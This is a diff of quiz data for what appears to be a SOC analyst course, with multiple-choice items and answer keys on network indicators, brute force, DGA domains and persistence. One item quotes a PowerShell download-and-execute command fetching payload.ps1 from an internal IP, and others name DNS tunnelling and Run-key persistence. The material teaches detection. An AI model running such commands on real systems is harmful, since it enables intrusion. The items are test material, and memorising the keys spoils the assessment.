@@ -402,10 +402,10 @@ When you're investigating a security incident, these networking concepts form yo
         question:
           "A SOC analyst sees this IP address in a firewall log as the source of an attack: 192.168.45.12. What type of IP address is this?",
         options: [
-          "A public IP address — reachable from anywhere on the internet",
-          "A private IP address — only usable within a local network",
-          "An IPv6 address in shorthand notation",
-          "A multicast address used for streaming",
+          "A public IP — routable on the internet, so the source is external",
+          "A private IP — RFC 1918 space that does not route on the internet",
+          "A link-local IP — auto-assigned when no DHCP server answered",
+          "A loopback IP — traffic that never leaves the sending host itself",
         ],
         answer: 1,
         explanation:
@@ -418,10 +418,10 @@ When you're investigating a security incident, these networking concepts form yo
         question:
           "During an incident investigation, you see a workstation making a TCP connection to port 4444 on an external IP. The three-way handshake completed successfully. What does this tell you?",
         options: [
-          "The connection was blocked by the firewall because port 4444 is reserved",
-          "The workstation is only listening, not sending data",
-          "A full TCP session was established — data was likely exchanged between the workstation and the external host",
-          "The packet was rejected because UDP should be used on port 4444",
+          "The firewall dropped the connection because port 4444 is a reserved port",
+          "The workstation is only listening on 4444 and has not sent any data yet",
+          "A full TCP session was established, so data could flow in both directions",
+          "Only the SYN reached the external host; the session never fully opened",
         ],
         answer: 2,
         explanation:
@@ -487,10 +487,10 @@ When you're investigating a security incident, these networking concepts form yo
             question:
               "What is the destination port of this connection, and why is it suspicious?",
             options: [
-              "Port 443 — suspicious because HTTPS should use port 80 instead",
-              "Port 4444 — suspicious because this is not an approved outbound port and is commonly used by attacker tools like Metasploit reverse shells",
-              "Port 51234 — suspicious because high ports should never be used for outbound connections",
-              "Port 8080 — suspicious because web traffic should only use port 80",
+              "Port 443 — suspicious because it is the usual port for encrypted C2 traffic",
+              "Port 4444 — not an approved outbound port, and the default Metasploit listener port",
+              "Port 51234 — suspicious because ephemeral ports never belong in outbound connections",
+              "Port 8080 — suspicious because workstations should not reach web proxies directly",
             ],
             answer: 1,
             explanation:
@@ -501,10 +501,10 @@ When you're investigating a security incident, these networking concepts form yo
             question:
               "The log shows src_ip: 10.5.12.47 and nat_src_ip: 203.0.113.15. What does this tell you?",
             options: [
-              "There are two attackers, one working from each IP address, coordinating the same reverse-shell session in parallel",
-              "The workstation has two separate network interfaces, each assigned its own IP, and the firewall logged both simultaneously",
-              "NAT translation occurred — the workstation's private IP (10.5.12.47) was translated to the company's public IP (203.0.113.15) as traffic left the network",
-              "The connection was blocked because the NAT translation table on the firewall ran out of available ports and failed to complete the mapping",
+              "Source spoofing — the attacker forged 10.5.12.47 and the firewall recorded the true address as 203.0.113.15",
+              "The workstation has two network interfaces, and the firewall logged both of its addresses",
+              "NAT — the private source 10.5.12.47 was translated to the public 203.0.113.15 on the way out",
+              "The NAT table ran out of ports, so the mapping failed and the connection was blocked",
             ],
             answer: 2,
             explanation:
@@ -815,10 +815,10 @@ These questions form the foundation of network-based threat investigation.`,
         question:
           "An attacker compromises a web server and wants to exfiltrate data without being detected by the firewall, which allows only port 53, 80, and 443 outbound. Which technique would most likely succeed?",
         options: [
-          "FTP exfiltration on port 21 — firewalls never block FTP",
-          "DNS tunneling through port 53 — DNS is almost always allowed and can carry encoded data",
-          "Telnet on port 23 — Telnet is faster than SSH for data transfer",
-          "RDP on port 3389 — remote desktop can transfer files",
+          "FTP in passive mode on port 21 — the data channel bypasses port filters",
+          "DNS tunneling over port 53 — queries can carry encoded data",
+          "SSH on port 22 — encrypted sessions hide the payload from the firewall",
+          "SMB on port 445 — file-share traffic is built to move bulk data",
         ],
         answer: 1,
         explanation:
@@ -831,10 +831,10 @@ These questions form the foundation of network-based threat investigation.`,
         question:
           "A SOC analyst sees 847 authentication failure events from IP 45.33.32.156 targeting port 3389 on a corporate server over 2 minutes, followed by 1 authentication success. What most likely happened?",
         options: [
-          "A legitimate user forgot their password multiple times before getting it right",
-          "The server's RDP service restarted, causing temporary failures",
-          "A successful RDP brute-force attack — the attacker guessed the correct password after hundreds of attempts",
-          "A network monitoring tool performing automated credential checks",
+          "A legitimate user stuck in a retry loop on an outdated saved RDP password",
+          "An RDP service restart that rejected logons until it came back up",
+          "A successful RDP brute-force — the attacker finally guessed the password",
+          "A monitoring tool running its scheduled credential check on the server",
         ],
         answer: 2,
         explanation:
@@ -883,10 +883,10 @@ These questions form the foundation of network-based threat investigation.`,
             question:
               "Why is the domain 'xk3r9qlpmf7wz2.com' suspicious compared to a normal domain like 'microsoft.com'?",
             options: [
-              "It uses the .com TLD, which is reserved exclusively for pre-vetted commercial businesses and cannot be registered by an individual or a piece of malware infrastructure",
-              "It is too short — ICANN requires all registered second-level domain names to be at least 20 characters long, so anything shorter is inherently invalid",
-              "It appears randomly generated with high entropy (random-looking mix of letters and numbers with no recognizable words) — a hallmark of DGA (Domain Generation Algorithm) malware",
-              "It contains numbers, which are not allowed in domain names under the DNS specification and should have caused the query to be rejected outright",
+              "It uses the .com TLD, which attackers rarely use compared with .xyz or .top",
+              "It contains digits, which legitimate registered domains almost never include",
+              "It looks randomly generated — a high-entropy mix with no real words, typical of DGA malware",
+              "It has no www subdomain, so the query cannot be a normal browser lookup",
             ],
             answer: 2,
             explanation:
@@ -897,10 +897,10 @@ These questions form the foundation of network-based threat investigation.`,
             question:
               "The log shows dst_ip: 8.8.8.8 instead of 10.0.0.53 (the corporate DNS). What is the security significance of this?",
             options: [
-              "8.8.8.8 is faster than 10.0.0.53, so the workstation's network stack automatically prefers it whenever both servers are reachable, purely for performance reasons",
-              "The workstation is bypassing the corporate DNS server to use Google's public DNS — this avoids corporate DNS monitoring and filtering, allowing the malware to reach domains that would be blocked",
-              "8.8.8.8 is the factory-default DNS server baked into every Windows installation, so any workstation querying it is simply using the unconfigured out-of-box setting",
-              "This indicates the corporate DNS server at 10.0.0.53 is down, so Windows automatically failed over to a public resolver as a built-in redundancy feature",
+              "8.8.8.8 is faster, so Windows prefers it whenever both are reachable — a performance choice",
+              "The workstation bypassed corporate DNS for Google's resolver, evading its monitoring and filtering",
+              "8.8.8.8 is the factory-default resolver in Windows, so this is just an unconfigured DNS setting",
+              "The corporate DNS at 10.0.0.53 was down, so Windows failed over to a public resolver",
             ],
             answer: 1,
             explanation:
@@ -924,10 +924,10 @@ These questions form the foundation of network-based threat investigation.`,
         question:
           "The WannaCry ransomware infected 200,000 computers in 150 countries in 2017. Which protocol vulnerability did it exploit to spread automatically across networks?",
         options: [
-          "HTTP on port 80 — it exploited web servers",
-          "DNS on port 53 — it poisoned DNS caches to spread",
-          "SMB on port 445 — it used the EternalBlue exploit (MS17-010) to spread across Windows machines",
-          "RDP on port 3389 — it brute-forced remote desktop services",
+          "HTTP on port 80 — it exploited unpatched IIS web servers",
+          "LDAP on port 389 — it abused domain controller queries to spread",
+          "SMB on port 445 — it used the EternalBlue exploit (MS17-010)",
+          "RDP on port 3389 — it used the BlueKeep exploit (CVE-2019-0708)",
         ],
         answer: 2,
         explanation:
@@ -1293,10 +1293,10 @@ A **proxy server** acts as an intermediary between clients and servers. Two type
             question:
               "The log shows 'syn_packets_without_ack: 14'. In the context of TCP's three-way handshake, what does this indicate about the scan technique?",
             options: [
-              "The attacker's connection was unstable and the final ACK packets were dropped in transit, unrelated to any scanning intent — a real port scan would show a matching ACK for every SYN, since Nmap always completes the three-way handshake before it records a port as open",
-              "This is a SYN scan (half-open scan) — the attacker sent SYN packets to probe ports but never completed the handshake. If a port is open, the server sends SYN-ACK; if closed, it sends RST. By never sending the final ACK, the attacker maps open ports without fully establishing connections (harder to detect)",
-              "The firewall was successfully blocking all the connection attempts — a DROP action strips the ACK flag out of the returning packets, and that flag removal is exactly what makes the syn_packets_without_ack counter climb on a correctly configured policy",
-              "This is normal TCP behavior for a busy server — the RFC 793 delayed-ACK mechanism lets a host defer the handshake's third packet for up to 40 seconds, so ACKs are routinely batched and logged well after their corresponding SYN packets",
+              "Final ACKs were dropped on an unstable link — a real scan completes every handshake before marking a port open",
+              "A SYN (half-open) scan — SYN probes read as SYN-ACK or RST, and the final ACK is never sent",
+              "The firewall's DROP policy stripped the ACK flags from returning packets, which raises that counter",
+              "Delayed-ACK batching on a busy server — hosts defer the handshake's third packet, so ACKs are logged late",
             ],
             answer: 1,
             explanation:
@@ -1307,10 +1307,10 @@ A **proxy server** acts as an intermediary between clients and servers. Two type
             question:
               "Looking at the dst_ports_scanned list, which port should be most concerning if found open and accessible from the internet?",
             options: [
-              "Port 80 — HTTP web traffic should never be reachable from the internet under any circumstances, even for a public-facing marketing site",
-              "Port 53 — DNS should never be visible from the internet, since any exposed DNS server is automatically an open resolver abused for amplification attacks",
-              "Port 3389 (RDP) — Remote Desktop Protocol exposed to the internet is a critical risk and a top initial access vector for ransomware attacks",
-              "Port 443 — HTTPS is inherently the most dangerous protocol to expose because encryption itself is what attackers exploit to gain access",
+              "Port 80 — unencrypted HTTP is the riskiest port to leave reachable from the internet",
+              "Port 53 — an exposed DNS server is always an open resolver used for amplification",
+              "Port 3389 (RDP) — internet-exposed RDP is a top initial access vector for ransomware",
+              "Port 443 — HTTPS exposure is the riskiest, since the encryption itself is what attackers exploit",
             ],
             answer: 2,
             explanation:
@@ -1334,10 +1334,10 @@ A **proxy server** acts as an intermediary between clients and servers. Two type
         question:
           "Your company implements network VLANs: VLAN 10 (Workstations), VLAN 20 (Servers), VLAN 30 (Finance), and VLAN 40 (Guest Wi-Fi). Ransomware infects a workstation on VLAN 10 and tries to spread via SMB (port 445). With proper firewall rules between VLANs, what is the best expected outcome?",
         options: [
-          "The ransomware immediately spreads to all VLANs because VLANs only separate network broadcast domains, not actual traffic",
-          "The ransomware is contained to VLAN 10 (Workstations) because firewall rules block SMB from VLAN 10 to VLAN 20/30/40 — limiting the blast radius significantly",
-          "The ransomware cannot spread at all because the infected workstation is on a VLAN",
-          "VLANs automatically stop ransomware using built-in signature detection",
+          "It spreads to all VLANs, because VLANs only separate broadcast domains and never filter traffic",
+          "It stays in VLAN 10, because inter-VLAN firewall rules block SMB toward VLANs 20, 30 and 40",
+          "It reaches only the VLAN 20 servers, because SMB from workstations to servers is always permitted",
+          "It is stopped by the VLAN tagging itself, which drops SMB frames at Layer 2",
         ],
         answer: 1,
         explanation:
@@ -1708,10 +1708,10 @@ This is exactly why the indicators from the previous reading matter as much as t
         question:
           "A SOC analyst notices that lsass.exe is running from C:\\Users\\attacker\\AppData\\Temp\\lsass.exe instead of C:\\Windows\\System32\\lsass.exe. What does this most likely indicate?",
         options: [
-          "This is normal — Windows occasionally relocates core system processes into user-writable directories temporarily to improve boot performance on slower disks",
-          "This is a fake lsass.exe process — likely malware disguising itself as the legitimate Windows authentication process. The real lsass.exe always runs from System32",
-          "The user has manually moved lsass.exe to a new location as part of a routine system optimization recommended by Windows",
-          "This indicates a Windows Update is currently in progress, temporarily relocating system files into the user's Temp folder during installation",
+          "A Windows Update staging copy — update installers briefly unpack system binaries into user Temp folders",
+          "A masquerading binary — the genuine lsass.exe only ever runs from C:\\Windows\\System32\\",
+          "A per-user instance — Windows starts a separate lsass.exe from each logged-on user's profile",
+          "A Credential Guard helper — it runs an isolated lsass.exe copy from a user-writable path",
         ],
         answer: 1,
         explanation:
@@ -1724,10 +1724,10 @@ This is exactly why the indicators from the previous reading matter as much as t
         question:
           "An attacker wants to maintain persistent access to a compromised Windows machine without requiring admin privileges. Which Registry location can they write to without elevation?",
         options: [
-          "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run — requires admin, applies to all users",
-          "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run — writable by any user, auto-starts programs when that user logs in",
-          "HKLM\\SYSTEM\\CurrentControlSet\\Services — requires admin, used for Windows services",
-          "HKLM\\SOFTWARE\\Policies — requires admin, contains Group Policy settings",
+          "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run — launches programs at logon for every user",
+          "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run — launches programs at logon for that user",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services — registers programs as services started at boot",
+          "HKLM\\SOFTWARE\\Policies — stores policy values applied to the whole machine",
         ],
         answer: 1,
         explanation:
@@ -1779,10 +1779,10 @@ This is exactly why the indicators from the previous reading matter as much as t
             question:
               "The parent process is winword.exe and the child process is powershell.exe. Why is this parent-child relationship suspicious?",
             options: [
-              "Microsoft Word requires PowerShell as a background dependency to render documents, so seeing winword.exe spawn powershell.exe is a normal and fully expected process tree",
-              "PowerShell should always be started by the System process (PID 4) directly, and any other parent process, including user applications, is a Windows configuration error unrelated to malware",
-              "Microsoft Word (a document editor) spawning PowerShell (a powerful scripting engine) strongly suggests a malicious macro inside the Word document executed a command — a common initial access technique for malware delivered via phishing emails",
-              "This only becomes suspicious if PowerShell then spawns another process itself — a single level of nesting from winword.exe straight to powershell.exe is considered acceptable and expected",
+              "Word launches PowerShell whenever a document uses Office add-ins, so this tree is expected",
+              "PowerShell started by a user application is only suspicious when it runs elevated",
+              "A document editor spawning a scripting engine suggests a malicious macro ran a command — a common phishing technique",
+              "It only becomes suspicious if PowerShell spawns a further child; one level of nesting is acceptable",
             ],
             answer: 2,
             explanation:
@@ -1793,10 +1793,10 @@ This is exactly why the indicators from the previous reading matter as much as t
             question:
               "The decoded_command field shows: 'IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.50/payload.ps1')'. What is this command doing?",
             options: [
-              "Checking Microsoft's official Windows Update servers for any patches that are currently available for the operating system",
-              "Running a routine diagnostic script that Microsoft pre-installs on every modern Windows system as part of telemetry collection",
-              "Downloading a PowerShell script from an internal server (192.168.10.50) and immediately executing it in memory using IEX (Invoke-Expression) — a fileless execution technique that avoids writing the payload to disk",
-              "Connecting to Microsoft's licensing cloud service to re-validate the installed Office subscription's activation status",
+              "Downloading payload.ps1 from an internal server and saving it to disk for later review",
+              "Fetching a configuration file from 192.168.10.50 and reading it as plain text data",
+              "Downloading a script from internal host 192.168.10.50 and running it in memory via IEX — fileless execution",
+              "Checking an internal server's health endpoint and returning its status string",
             ],
             answer: 2,
             explanation:
